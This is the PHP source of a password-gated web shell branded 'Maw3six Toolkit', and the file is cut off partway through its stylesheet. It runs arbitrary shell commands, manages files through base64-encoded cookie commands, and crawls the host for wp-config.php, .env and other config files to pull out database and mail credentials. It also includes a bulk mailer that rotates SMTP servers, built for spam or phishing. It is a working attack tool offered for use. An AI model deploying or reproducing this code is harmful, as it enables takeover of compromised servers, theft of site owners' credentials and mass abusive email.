<?php
session_start();

$hashed_password = '$2a$12$AF.sjRyPPrIw9pwlRq6zsuF2nEQ5/r0kJ7V6fVXAxIx1nNcqYtjl6';

function isAuthenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Access Denied!";
    }
}

if (!isAuthenticated()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Maw3six Toolkit</title>
    <style>
    :root {
        --background: #1a1d24;
        --foreground: #e0e0e0;
        --prompt: #50fa7b;
        --border: #44475a;
        --input-bg: #222;
        --button-bg: #6272a4;
        --error: #ff5555;
    }
    html, body {
        height: 100%;
        margin: 0;
        padding: 0;
        background-color: var(--background);
        color: var(--foreground);
        font-family: 'Menlo', 'Consolas', 'monospace';
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .login-container {
        background-color: var(--input-bg);
        border: 1px solid var(--border);
        border-radius: 5px;
        padding: 30px;
        width: 300px;
        box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    .login-container h2 {
        text-align: center;
        margin-top: 0;
        color: var(--prompt);
    }
    .form-group {
        margin-bottom: 15px;
    }
    label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
    }
    input[type="password"] {
        width: 100%;
        padding: 8px;
        background-color: var(--background);
        border: 1px solid var(--border);
        color: var(--foreground);
        border-radius: 4px;
        box-sizing: border-box;
        font-family: inherit;
    }
    button {
        width: 100%;
        padding: 10px;
        background-color: var(--button-bg);
        color: var(--foreground);
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-family: inherit;
        font-size: 1em;
    }
    button:hover {
        opacity: 0.9;
    }
    .error {
        color: var(--error);
        text-align: center;
        margin-top: 10px;
    }
    .login-info {
        text-align: center;
        font-size: 0.9em;
        color: #aaa;
        margin-top: 15px;
    }
    </style>
    </head>
    <body>
    <div class="login-container">
    <h2>Maw3six Toolkit</h2>
    <form method="post">
    <div class="form-group">
    <input type="password" id="password" name="password" required>
    </div>
    <button type="submit">Authenticate</button>
    <?php if (!empty($error)): ?>
    <div class="error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    <div class="login-info">Restricted Access</div>
    </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}
?>

<?php

@set_time_limit(0);
@error_reporting(0);
date_default_timezone_set('UTC');

// --- Helper Functions ---
function randString($length, $charset)
{
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $charset[(rand() % strlen($charset))];
    }
    return $password;
}

function Maw3sixClear($text, $recipient_email, $sender_email)
{
    $e = explode('@', $recipient_email);
    $emailuser = $e[0];
    $emaildomain = $e[1] ?? '';

    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-email-]", $recipient_email, $text);
    $text = str_replace("[-emailuser-]", $emailuser, $text);
    $text = str_replace("[-emaildomain-]", $emaildomain, $text);
    $text = str_replace("[-sender-]", $sender_email, $text);

    // Randomization Macros
    $text = str_replace("[-randomletters-]", randString(rand(8, 20), 'abcdefghijklmnopqrstuvwxyz'), $text);
    $text = str_replace("[-randomstring-]", randString(rand(8, 20), 'abcdefghijklmnopqrstuvwxyz0123456789'), $text);
    $text = str_replace("[-randomnumber-]", randString(rand(8, 20), '0123456789'), $text);
    $text = str_replace("[-randommd5-]", md5(randString(rand(8, 20), 'abcdefghijklmnopqrstuvwxyz0123456789')), $text);

    return $text;
}


// --- Cookie-based Command Execution (File Manager Only) ---
if (isset($_COOKIE['cmd'])) {
    header('Content-Type: application/json');
    $response = ['success' => false, 'output' => 'Invalid command structure.'];

    // --- File Manager Commands (via 'cmd' cookie) ---
    $command = json_decode(base64_decode($_COOKIE['cmd']), true);
    if ($command && isset($command['call'])) {
        $target = $command['target'] ?? null;
        if ($target) {
            $base_dir = realpath(getcwd());
            $target_path = realpath(dirname($target));
            if (strpos($target_path, $base_dir) !== 0 && substr($target_path, 0, strlen('/tmp')) !== '/tmp') {
                $response['output'] = 'Error: Access denied or path is outside the allowed scope.';
                echo json_encode($response);
                exit;
            }
        }

        switch ($command['call']) {
            case 'create_file':
                if (@file_put_contents($command['target'], $command['content']) !== false) {
                    $response = ['success' => true, 'output' => 'File saved successfully.'];
                } else {
                    $response['output'] = 'Error: Could not write to file.';
                }
                break;
            case 'create_folder':
                if (@mkdir($command['target'])) {
                    $response = ['success' => true, 'output' => 'Folder created successfully.'];
                } else {
                    $response['output'] = 'Error: Could not create folder.';
                }
                break;
            case 'rename':
                if (@rename($command['target'], $command['destination'])) {
                    $response = ['success' => true, 'output' => 'Renamed successfully.'];
                } else {
                    $response['output'] = 'Error: Rename failed.';
                }
                break;
            case 'delete':
                function rmdir_recursive($dir)
                {
                    if (!file_exists($dir))
                        return true;
                    if (!is_dir($dir))
                        return unlink($dir);
                    foreach (scandir($dir) as $item) {
                        if ($item == '.' || $item == '..')
                            continue;
                        if (!rmdir_recursive($dir . DIRECTORY_SEPARATOR . $item))
                            return false;
                    }
                    return rmdir($dir);
                }
                if (rmdir_recursive($command['target'])) {
                    $response = ['success' => true, 'output' => 'Deleted successfully.'];
                } else {
                    $response['output'] = 'Error: Delete failed.';
                }
                break;
            case 'chmod':
                if (@chmod($command['target'], octdec($command['perms']))) {
                    $response = ['success' => true, 'output' => 'Permissions changed.'];
                } else {
                    $response['output'] = 'Error: Chmod failed.';
                }
                break;
            case 'zip':
                if (!class_exists('ZipArchive')) {
                    $response['output'] = 'Error: ZipArchive class not found.';
                    break;
                }
                $zip = new ZipArchive();
                $zipFile = $command['destination'];
                if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
                    $response['output'] = 'Error: Could not create zip archive.';
                    break;
                }
                $source = realpath($command['target']);
                if (is_dir($source)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($files as $file) {
                        $file = realpath($file);
                        $relativePath = substr($file, strlen($source) + 1);
                        if (is_dir($file)) {
                            $zip->addEmptyDir($relativePath);
                        } else if (is_file($file)) {
                            $zip->addFromString($relativePath, file_get_contents($file));
                        }
                    }
                } elseif (is_file($source)) {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
                $zip->close();
                $response = ['success' => true, 'output' => 'Folder zipped successfully.'];
                break;
        }
    }
    setcookie('cmd', '', time() - 3600, '/');


    echo json_encode($response);
    exit;
}


// --- AJAX Command Execution Logic ---
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $current_dir = isset($_POST['cwd']) && is_dir($_POST['cwd']) ? realpath($_POST['cwd']) : realpath(getcwd());

    // --- Terminal Command Execution ---
    if ($action === 'shell' && isset($_POST['cmd'])) {
        header('Content-Type: text/plain');
        $command = $_POST['cmd'];
        if (preg_match('/^cd\s+(.*)$/', $command, $matches)) {
            $new_dir = trim($matches[1]);
            if ($new_dir === '' || $new_dir === '~') {
                $new_dir = getenv('HOME') ?: (getenv('HOMEDRIVE') . getenv('HOMEPATH'));
            }
            if (substr($new_dir, 0, 1) !== '/' && substr($new_dir, 1, 1) !== ':') {
                $new_dir = $current_dir . DIRECTORY_SEPARATOR . $new_dir;
            }
            if (@chdir($new_dir)) {
                echo "SUCCESS:cd:" . getcwd();
            } else {
                echo "ERROR:cd:Cannot access '$matches[1]': No such file or directory";
            }
            exit;
        }
        $output = '';
        if (function_exists('proc_open')) {
            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = proc_open($command, $descriptors, $pipes, $current_dir);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                $error_output = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($error_output))
                    $output .= "\n" . $error_output;
            }
        } elseif (function_exists('exec')) {
            exec($command . ' 2>&1', $output_lines);
            $output = implode("\n", $output_lines);
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec($command . ' 2>&1');
        } else {
            $output = "ERROR: All command execution functions are disabled.";
        }
        echo trim($output);
    }
    // --- Config Hunter Tool ---
    elseif ($action === 'scan_configs') {
        header('Content-Type: application/json');
        $results = [];
        $common_roots = ['.', '..', 'public_html', 'www', 'httpdocs', 'htdocs'];
        $config_files = [
            'wp-config.php',
            'wp-config-sample.php',
            '.env',
            '.env.example',
            '.env.local',
            '.env.production',
            'config/database.php',
            'config/app.php',
            'config/mail.php',
            'config/services.php',
            'config/filesystems.php',
            'config/cache.php',
            '.env.staging',
            '.env.dev',
            '.env.testing',
            'application/config/database.php',
            'application/config/config.php',
            'application/config/email.php',
            'protected/config/main.php',
            'protected/config/database.php',
            'config/web.php',
            'config/console.php',
            'config/db.php',
            'config/params.php',
            'app/config/parameters.yml',
            'app/config/parameters.yaml',
            'config/packages/doctrine.yaml',
            'config/packages/mail.yaml',
            'config/secrets/prod/prod.list',
            'config/app.php',
            'config/.env',
            'sites/default/settings.php',
            'sites/default/settings.local.php',
            'sites/example.settings.local.php',
            'configuration.php',
            'app/etc/local.xml',
            'app/etc/env.php',
            'app/etc/config.php',
            'LocalSettings.php',
            'config.php',
            'config.inc.php',
            'settings.inc.php',
            'includes/config.php',
            'inc/config.php',
            '.htaccess',
            'auth.json',
            'phinx.php',
        ];
        foreach ($common_roots as $root) {
            $path = realpath($current_dir . '/' . $root);
            if (!$path)
                continue;
            try {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $file) {
                    if ($file->isFile() && in_array($file->getFilename(), $config_files)) {
                        $content = @file_get_contents($file->getPathname());
                        if ($content === false)
                            continue;
                        $creds = [];
                        if (preg_match("/DB_HOST',\s*'([^']+)'/", $content, $m))
                            $creds['DB_HOST'] = $m[1];
                        if (preg_match("/DB_USER',\s*'([^']+)'/", $content, $m))
                            $creds['DB_USER'] = $m[1];
                        if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m))
                            $creds['DB_PASSWORD'] = $m[1];
                        if (preg_match('/public \$host = \'([^\']+)\';/', $content, $m))
                            $creds['DB_HOST'] = $m[1];
                        if (preg_match('/public \$user = \'([^\']+)\';/', $content, $m))
                            $creds['DB_USER'] = $m[1];
                        if (preg_match('/public \$password = \'([^\']+)\';/', $content, $m))
                            $creds['DB_PASSWORD'] = $m[1];
                        if (preg_match('/MAIL_HOST=(.*)/', $content, $m))
                            $creds['MAIL_HOST'] = trim($m[1]);
                        if (preg_match('/MAIL_PORT=(.*)/', $content, $m))
                            $creds['MAIL_PORT'] = trim($m[1]);
                        if (
                            preg_match(
                                '/MAIL_USERNAME=(.*)/',
                                $content,
                                $m
                            )
                        )
                            $creds['MAIL_USERNAME'] = trim($m[1]);
                        if (preg_match('/MAIL_PASSWORD=(.*)/', $content, $m))
                            $creds['MAIL_PASSWORD'] = trim($m[1]);
                        if (!empty($creds)) {
                            $results[] = ['path' => $file->getPathname(), 'creds' => $creds];
                        }
                    }
                }
            } catch (Exception $e) { /* Ignore */
            }
        }
        echo json_encode($results);
    }
    // --- SMTP Port Scanner ---
    elseif ($action === 'scan_smtp') {
        header('Content-Type: application/json');
        $results = [];
        $ports_to_check = [25, 465, 587, 2525];
        $test_host = 'smtp.google.com';
        $timeout = 3;
        $results['fsockopen'] = function_exists('fsockopen');
        $results['ports'] = [];
        foreach ($ports_to_check as $port) {
            $connection = @fsockopen($test_host, $port, $errno, $errstr, $timeout);
            if (is_resource($connection)) {
                $results['ports'][] = ['port' => $port, 'status' => 'Open'];
                fclose($connection);
            } else {
                $results['ports'][] = ['port' => $port, 'status' => 'Blocked'];
            }
        }
        echo json_encode($results);
    }
    // --- File Manager Actions ---
    elseif ($action === 'file_manager') {
        header('Content-Type: application/json');
        $do = $_POST['do'] ?? 'list';
        $path = $_POST['path'] ?? $current_dir;
        $base_dir = realpath(getcwd());

        // Helper to format file permissions
        function get_perms_str($file)
        {
            $perms = fileperms($file);
            if (($perms & 0xC000) == 0xC000)
                $info = 's';
            elseif (($perms & 0xA000) == 0xA000)
                $info = 'l';
            elseif (($perms & 0x8000) == 0x8000)
                $info = '-';
            elseif (($perms & 0x6000) == 0x6000)
                $info = 'b';
            elseif (($perms & 0x4000) == 0x4000)
                $info = 'd';
            elseif (($perms & 0x2000) == 0x2000)
                $info = 'c';
            elseif (($perms & 0x1000) == 0x1000)
                $info = 'p';
            else
                $info = 'u';
            $info .= (($perms & 0x0100) ? 'r' : '-');
            $info .= (($perms & 0x0080) ? 'w' : '-');
            $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-');
            $info .= (($perms & 0x0010) ? 'w' : '-');
            $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-');
            $info .= (($perms & 0x0002) ? 'w' : '-');
            $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
            return $info;
        }

        switch ($do) {
            case 'list':
                $files = [];
                $dirs = [];
                $scandir = @scandir($path);
                if ($scandir === false) {
                    echo json_encode(['error' => 'Could not read directory.']);
                    exit;
                }
                foreach ($scandir as $item) {
                    if ($item === '.')
                        continue;
                    $full_path = $path . DIRECTORY_SEPARATOR . $item;
                    $item_data = ['name' => $item, 'path' => $full_path, 'size' => is_dir($full_path) ? '-' : filesize($full_path), 'perms' => get_perms_str($full_path), 'mtime' => date("Y-m-d H:i:s", filemtime($full_path))];
                    if (is_dir($full_path))
                        $dirs[] = $item_data;
                    else
                        $files[] = $item_data;
                }
                $server_info = ['cwd' => $path, 'php_version' => PHP_VERSION, 'uname' => php_uname(), 'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']), 'zip_enabled' => class_exists('ZipArchive')];
                echo json_encode(['info' => $server_info, 'items' => array_merge($dirs, $files)]);
                break;
            case 'get_content':
                $file = $_POST['target'] ?? null;
                if ($file && is_file($file) && is_readable($file)) {
                    echo json_encode(['success' => true, 'content' => file_get_contents($file)]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'Cannot read file.']);
                }
                break;
            case 'download':
                $file = $_GET['file'] ?? null;
                if ($file && is_file($file) && is_readable($file)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                }
                http_response_code(404);
                echo "File not found.";
                break;
            case 'upload':
                function reArrayFiles(&$file_post)
                {
                    $file_ary = array();
                    $file_count = count($file_post['name']);
                    $file_keys = array_keys($file_post);
                    for ($i = 0; $i < $file_count; $i++) {
                        foreach ($file_keys as $key) {
                            $file_ary[$i][$key] = $file_post[$key][$i];
                        }
                    }
                    return $file_ary;
                }
                $response = ['success' => false, 'output' => 'No files were uploaded.'];
                if (!empty($_FILES['uploaded_files'])) {
                    $files = reArrayFiles($_FILES['uploaded_files']);
                    $messages = [];
                    $success_count = 0;
                    $real_path = realpath($path);
                    if (strpos($real_path, $base_dir) !== 0) {
                        $messages[] = "Upload failed: Path is outside allowed scope.";
                    } else {
                        foreach ($files as $file) {
                            if ($file['error'] === UPLOAD_ERR_OK) {
                                $destination = $path . DIRECTORY_SEPARATOR . basename($file['name']);
                                if (move_uploaded_file($file['tmp_name'], $destination)) {
                                    $messages[] = "Successfully uploaded {$file['name']}.";
                                    $success_count++;
                                } else {
                                    $messages[] = "Upload failed for {$file['name']}. Check permissions.";
                                }
                            } else {
                                $messages[] = "Upload error for {$file['name']}: error code {$file['error']}.";
                            }
                        }
                    }
                    $response = ['success' => $success_count > 0, 'output' => implode("\n", $messages)];
                }
                echo json_encode($response);
                break;
        }
    }
    // --- Mail Tester Tool (STREAMING VERSION) ---
    elseif ($action === 'send_mail') {
        // --- Headers for Streaming ---
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-cache');
        header('X-Content-Type-Options: nosniff');

        // --- Disable output buffering for real-time output ---
        if (function_exists('apache_setenv')) {
            @apache_setenv('no-gzip', '1');
        }
        @ini_set('zlib.output_compression', 0);
        @ini_set('output_buffering', 'Off');
        @ini_set('implicit_flush', 1);
        ob_implicit_flush(1);

        // Start a new buffer that we can manually flush
        ob_start();

        function stream_message($message)
        {
            echo $message . "\n";
            // Send padding to try and force proxies/browsers to flush the buffer
            echo str_repeat(' ', 1024);
            ob_flush();
            flush();
        }

        $recipients = preg_split('/\\r\\n|\\r|\\n/', trim($_POST['to']));
        $recipients = array_filter(array_map('trim', $recipients));
        $total_recipients = count($recipients);
        if ($total_recipients === 0) {
            stream_message("ERROR: No recipient emails provided.");
            exit;
        }

        $from_email_base = $_POST['from'];
        $from_name_base = $_POST['from_name'] ?: 'Maw3six Test';
        $subject_base = $_POST['subject'];
        $body_base = $_POST['body'];
        $is_html = ($_POST['content_type'] === 'html');
        $smtp_list_str = trim($_POST['smtp_list']);
        $use_from_as_login = isset($_POST['from_as_login']);
        $rotate_after = (int) ($_POST['rotate_after'] ?? 0);
        $pause_for = (int) ($_POST['pause_for'] ?? 0);
        $pause_every = (int) ($_POST['pause_every'] ?? 0);
        $sent_count = 0;
        $failed_count = 0;
        $current_smtp_index = 0;
        $smtps = [];

        function apply_throttle($pause_every, $pause_for, $total_processed, $total_recipients)
        {
            if ($pause_every > 0 && $pause_for > 0 && $total_processed > 0 && $total_processed % $pause_every === 0 && $total_processed < $total_recipients) {
                stream_message("--- Forcing a {$pause_for} second pause... ---");
                $start_time = time();
                while (time() < ($start_time + $pause_for)) {
                    // This is a busy-wait loop that consumes CPU to enforce the pause.
                    // It is used because sleep() can be unreliable on some hosts.
                }
            }
        }

        if (empty($smtp_list_str)) { // --- LOCAL MAILER ---
            if (!function_exists('mail')) {
                stream_message("ERROR: The mail() function is disabled. Please use SMTP.");
                exit;
            }
            foreach ($recipients as $to) {
                $from_email = Maw3sixClear($from_email_base, $to, $from_email_base);
                $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain';
                $from_name = Maw3sixClear($from_name_base, $to, $from_email);
                $subject = Maw3sixClear($subject_base, $to, $from_email);
                $body = Maw3sixClear($body_base, $to, $from_email);
                $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
                $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
                if ($is_html) {
                    $boundary = "----=" . md5(uniqid(time()));
                    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
                    $plain_text_body = strip_tags($body);
                    $message_body = "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
                    $message_body .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$body\r\n\r\n";
                    $message_body .= "--$boundary--";
                } else {
                    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
                    $message_body = $body;
                }
                if (mail($to, $subject, $message_body, $headers)) {
                    $sent_count++;
                    stream_message("-> Sent to $to");
                } else {
                    $failed_count++;
                    stream_message("-> FAILED for $to");
                }
                apply_throttle($pause_every, $pause_for, ($sent_count + $failed_count), $total_recipients);
            }
        } else { // --- SMTP MAILER ---
            $smtp_lines = preg_split('/\\r\\n|\\r|\\n/', $smtp_list_str);
            foreach ($smtp_lines as $line) {
                if (trim($line) !== '') {
                    $parts = explode(':', trim($line), 5);
                    $smtps[] = ['host' => $parts[0] ?? '', 'port' => $parts[1] ?? '', 'user' => $parts[2] ?? '', 'pass' => $parts[3] ?? '', 'enc' => strtolower($parts[4] ?? '')];
                }
            }
            if (empty($smtps)) {
                stream_message("ERROR: SMTP list is provided but is empty or malformed.");
                exit;
            }

            foreach ($recipients as $to) {
                if ($rotate_after > 0 && $sent_count > 0 && $sent_count % $rotate_after === 0) {
                    $current_smtp_index = ($current_smtp_index + 1) % count($smtps);
                    stream_message("--- Rotating to SMTP #" . ($current_smtp_index + 1) . " ---");
                }
                $current_smtp = $smtps[$current_smtp_index];
                $from_email = $use_from_as_login ? $current_smtp['user'] : $from_email_base;
                $from_name = Maw3sixClear($from_name_base, $to, $from_email);
                $subject = Maw3sixClear($subject_base, $to, $from_email);
                $body = Maw3sixClear($body_base, $to, $from_email);
                $mailer = new Maw3sixMailer(true);
                try {
                    $mailer->isHTML = $is_html;
                    $mailer->Host = $current_smtp['host'];
                    $mailer->Port = (int) $current_smtp['port'];
                    $mailer->SMTPSecure = $current_smtp['enc'];
                    $mailer->Username = $current_smtp['user'];
                    $mailer->Password = $current_smtp['pass'];
                    $mailer->SMTPAuth = true;
                    $mailer->setFrom($from_email, $from_name);
                    $mailer->addAddress($to);
                    $mailer->Subject = $subject;
                    $mailer->Body = $body;
                    $mailer->send();
                    $sent_count++;
                    stream_message("-> Sent to $to via " . $current_smtp['host']);
                } catch (Exception $e) {
                    $failed_count++;
                    stream_message("-> FAILED for $to via " . $current_smtp['host'] . " (" . $e->getMessage() . ")");
                }
                unset($mailer);

                apply_throttle($pause_every, $pause_for, ($sent_count + $failed_count), $total_recipients);
            }
        }
        stream_message("\nSUCCESS: Task complete. Sent: $sent_count, Failed: $failed_count");
        ob_end_flush(); // Clean up the buffer
    }
    exit;
}

// --- Embedded Maw3sixMailer Class (v2.5.1) ---
class Maw3sixMailer
{
    public $Host = 'localhost';
    public $Port = 25;
    public $SMTPAuth = false;
    public $Username = '';
    public $Password = '';
    public $SMTPSecure = '';
    public $Timeout = 10;
    public $ErrorInfo = '';
    public $isHTML = false;
    protected $smtp = null;
    public $FromName;
    public $From;
    public $To = [];
    public $Subject;
    public $Body;
    public function __construct($exceptions = false)
    {
    }
    public function setFrom($address, $name = '')
    {
        $this->From = $address;
        $this->FromName = $name;
    }
    public function addAddress($address, $name = '')
    {
        $this->To[] = $address;
    }
    public function send()
    {
        $this->smtp = new Maw3sixSMTP();
        $host = $this->Host;
        $use_crypto = ($this->SMTPSecure === 'ssl' || $this->SMTPSecure === 'tls');
        if ($use_crypto) {
            $host = $this->SMTPSecure . '://' . $this->Host;
        }
        if (!$this->smtp->connect($host, $this->Port, $this->Timeout)) {
            throw new Exception("SMTP Connect failed: " . $this->smtp->getError()['error']);
        }
        if (!$use_crypto) {
            if (!$this->smtp->hello(gethostname())) {
                throw new Exception("EHLO failed: " . $this->smtp->getError()['error']);
            }
            if ($this->SMTPSecure === 'starttls') {
                if (!$this->smtp->startTLS()) {
                    throw new Exception("STARTTLS failed: " . $this->smtp->getError()['error']);
                }
            }
        }
        if (!$this->smtp->hello(gethostname())) {
            throw new Exception("EHLO (after crypto) failed: " . $this->smtp->getError()['error']);
        }
        if ($this->SMTPAuth) {
            if (!$this->smtp->authenticate($this->Username, $this->Password)) {
                throw new Exception("SMTP Auth failed: " . $this->smtp->getError()['error']);
            }
        }
        if (!$this->smtp->mail($this->From)) {
            throw new Exception("MAIL FROM failed: " . $this->smtp->getError()['error']);
        }
        foreach ($this->To as $to_email) {
            if (!$this->smtp->recipient($to_email)) {
                throw new Exception("RCPT TO failed for $to_email: " . $this->smtp->getError()['error']);
            }
        }
        if (!$this->smtp->data($this->buildMessage())) {
            throw new Exception("DATA failed: " . $this->smtp->getError()['error']);
        }
        $this->smtp->quit();
        return true;
    }
    protected function buildMessage()
    {
        $from_domain = explode('@', $this->From)[1] ?? 'localhost.localdomain';
        $msg = "Date: " . date('r') . "\r\n";
        $msg .= "To: " . implode(',', $this->To) . "\r\n";
        $msg .= "From: " . $this->FromName . " <" . $this->From . ">\r\n";
        $msg .= "Subject: " . $this->Subject . "\r\n";
        $msg .= "Message-ID: <" . md5(uniqid(time())) . "@" . $from_domain . ">\r\n";
        $msg .= "MIME-Version: 1.0\r\n";
        if ($this->isHTML) {
            $boundary = "----=" . md5(uniqid(time()));
            $msg .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n";
            $plain_text_body = strip_tags($this->Body);
            $msg .= "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
            $msg .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$this->Body\r\n\r\n";
            $msg .= "--$boundary--";
        } else {
            $msg .= "Content-Type: text/plain; charset=utf-8\r\n\r\n";
            $msg .= $this->Body;
        }
        return $msg;
    }
}
class Maw3sixSMTP
{
    protected $connection = false;
    protected $error = ['error' => ''];
    public function connect($host, $port, $timeout)
    {
        if ($this->connection) {
            fclose($this->connection);
        }
        $this->connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if (!$this->connection) {
            $this->error = ['error' => "$errstr ($errno)"];
            return false;
        }
        stream_set_timeout($this->connection, $timeout);
        $this->getServerResponse();
        return true;
    }
    public function hello($host)
    {
        return $this->sendCommand("EHLO $host", 250);
    }
    public function startTLS()
    {
        if (!$this->sendCommand('STARTTLS', 220))
            return false;
        if (!stream_socket_enable_crypto($this->connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT))
            return false;
        return true;
    }
    public function authenticate($user, $pass)
    {
        if (!$this->sendCommand('AUTH LOGIN', 334))
            return false;
        if (!$this->sendCommand(base64_encode($user), 334))
            return false;
        if (!$this->sendCommand(base64_encode($pass), 235))
            return false;
        return true;
    }
    public function mail($from)
    {
        return $this->sendCommand("MAIL FROM:<$from>", 250);
    }
    public function recipient($to)
    {
        return $this->sendCommand("RCPT TO:<$to>", [250, 251]);
    }
    public function data($msg)
    {
        if (!$this->sendCommand('DATA', 354))
            return false;
        fputs($this->connection, $msg . "\r\n.\r\n");
        return $this->getServerResponse(250);
    }
    public function quit()
    {
        if (is_resource($this->connection)) {
            $this->sendCommand('QUIT', 221);
            fclose($this->connection);
            $this->connection = false;
        }
    }
    public function getError()
    {
        return $this->error;
    }
    protected function sendCommand($cmd, $expect)
    {
        if (!is_resource($this->connection)) {
            $this->error = ['error' => 'No connection'];
            return false;
        }
        fputs($this->connection, $cmd . "\r\n");
        return $this->getServerResponse($expect);
    }
    protected function getServerResponse($expect = null)
    {
        $response = '';
        while (is_resource($this->connection) && !feof($this->connection)) {
            $line = fgets($this->connection, 515);
            if ($line === false)
                break;
            $response .= $line;
            if (substr($line, 3, 1) == ' ' || empty($line))
                break;
        }
        $code = (int) substr($response, 0, 3);
        $this->error = ['error' => $response];
        if ($expect !== null) {
            if (is_array($expect)) {
                return in_array($code, $expect);
            }
            return $code == $expect;
        }
        return true;
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maw3six Toolkit</title>
    <style>
        :root {
            --background: #1a1d24;
            --foreground: #e0e0e0;
            --prompt: #50fa7b;
            --cursor: rgba(0, 255, 0, 0.8);
            --border: #44475a;
            --tab-bg: #282a36;
            --tab-active-bg: #44475a;
            --input-bg: #222;
            --button-bg: #6272a4;
            --success: #50fa7b;
            --error: #ff5555;
            --warn: #f1fa8c;
        }

        html,
        body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: var(--background);
            color: var(--foreground);
            font-family: 'Menlo', 'Consolas', 'monospace';
            font-size: 14px;
        }

        .tabs {
            display: flex;
            background-color: var(--tab-bg);
        }

        .tab-link {
            padding: 10px 15px;
            cursor: pointer;
            border-bottom: 3px solid transparent;
        }

        .tab-link.active {
            background-color: var(--tab-active-bg);
            border-bottom-color: var(--prompt);
        }

        .tab-content {
            display: none;
            height: calc(100% - 41px);
            overflow-y: auto;
        }

        .tab-content.active {
            display: block;
        }

        #terminal,
        #tools {
            width: 100%;
            height: 100%;
            box-sizing: border-box;
            padding: 15px;
        }

        .line {
            display: flex;
        }

        .prompt {
            color: var(--prompt);
            font-weight: bold;
            margin-right: 8px;
            white-space: nowrap;
        }

        .input-area {
            flex-grow: 1;
            display: flex;
        }

        #input {
            background: none;
            border: none;
            color: var(--foreground);
            font-family: inherit;
            font-size: inherit;
            flex-grow: 1;
            padding: 0;
        }

        #input:focus {
            outline: none;
        }

        .cursor {
            background-color: var(--cursor);
            display: inline-block;
            width: 8px;
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {

            from,
            to {
                background-color: transparent;
            }

            50% {
                background-color: var(--cursor);
            }
        }

        .output {
            margin-bottom: 10px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .tool-section {
            margin-bottom: 25px;
            border: 1px solid var(--border);
            border-radius: 5px;
            padding: 15px;
        }

        .tool-section h2 {
            margin-top: 0;
            color: var(--prompt);
            border-bottom: 1px solid var(--border);
            padding-bottom: 10px;
        }

        .tool-section button {
            background-color: var(--button-bg);
            color: var(--foreground);
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
        }

        .form-grid {
            display: grid;
            grid-template-columns: 120px 1fr;
            gap: 10px;
            align-items: center;
        }

        .form-grid label,
        .form-grid .label {
            font-weight: bold;
            align-self: start;
            padding-top: 8px;
        }

        .form-grid input,
        .form-grid textarea,
        .form-grid select {
            width: 100%;
